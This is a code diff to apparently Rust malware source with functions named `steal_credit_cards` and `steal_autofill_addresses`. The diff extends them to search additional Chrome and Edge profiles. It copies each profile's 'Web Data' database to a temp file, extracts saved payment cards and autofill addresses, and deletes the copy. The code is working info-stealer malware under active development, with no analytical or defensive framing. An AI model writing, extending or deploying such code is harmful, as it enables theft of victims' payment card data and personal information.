@@ -150,6 +150,31 @@ pub fn steal_credit_cards() -> Vec<CreditCard> {
         if let Some(mut cards) = steal_credit_cards_from_browser(browser) {
             all_cards.append(&mut cards);
         }
+        
+        // 🔍 DEBUG: Buscar en perfiles adicionales (Profile 1, Profile 2, etc.)
+        if browser.name == "Edge" || browser.name == "Chrome" {
+            if let Some(local_appdata) = get_appdata_local() {
+                let browser_dir = if browser.name == "Edge" {
+                    local_appdata.join(r"Microsoft\Edge\User Data")
+                } else {
+                    local_appdata.join(r"Google\Chrome\User Data")
+                };
+                
+                // Buscar en Profile 1, Profile 2, etc.
+                for i in 1..=5 {
+                    let profile_name = format!("Profile {}", i);
+                    let profile_path = browser_dir.join(&profile_name).join("Web Data");
+                    
+                    if profile_path.exists() {
+                        if let Some(temp_path) = copy_to_temp(&profile_path) {
+                            let mut profile_cards = extract_credit_cards(&temp_path, &format!("{} ({})", browser.name, profile_name));
+                            all_cards.append(&mut profile_cards);
+                            std::fs::remove_file(&temp_path).ok();
+                        }
+                    }
+                }
+            }
+        }
     }
     
     all_cards
@@ -250,6 +275,31 @@ pub fn steal_autofill_addresses() -> Vec<AutofillAddress> {
     for browser in BROWSERS {
         if let Some(mut addresses) = steal_autofill_from_browser(browser) {
             all_addresses.append(&mut addresses);
+        }
+        
+        // 🔍 DEBUG: Buscar en perfiles adicionales (Profile 1, Profile 2, etc.)
+        if browser.name == "Edge" || browser.name == "Chrome" {
+            if let Some(local_appdata) = get_appdata_local() {
+                let browser_dir = if browser.name == "Edge" {
+                    local_appdata.join(r"Microsoft\Edge\User Data")
+                } else {
+                    local_appdata.join(r"Google\Chrome\User Data")
+                };
+                
+                // Buscar en Profile 1, Profile 2, etc.
+                for i in 1..=5 {
+                    let profile_name = format!("Profile {}", i);
+                    let profile_path = browser_dir.join(&profile_name).join("Web Data");
+                    
+                    if profile_path.exists() {
+                        if let Some(temp_path) = copy_to_temp(&profile_path) {
+                            let mut profile_addresses = extract_autofill_addresses(&temp_path, &format!("{} ({})", browser.name, profile_name));
+                            all_addresses.append(&mut profile_addresses);
+                            std::fs::remove_file(&temp_path).ok();
+                        }
+                    }
+                }
+            }
         }
     }
     
